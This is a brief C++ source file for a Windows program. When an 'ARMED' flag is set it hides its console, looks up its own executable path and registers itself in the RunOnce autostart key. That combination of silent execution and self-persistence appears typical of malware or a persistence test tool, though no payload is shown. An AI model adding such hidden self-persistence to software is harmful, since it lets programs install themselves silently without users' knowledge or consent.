#include "pch.h"
#include "autostart/autostart.h"

int main() {
	if constexpr (ARMED) FreeConsole();

	TCHAR location[MAX_PATH];
	GetModuleFileName(NULL, location, MAX_PATH);
	const bool aa = autostart::addto_runonce(location);

	return 0;
}
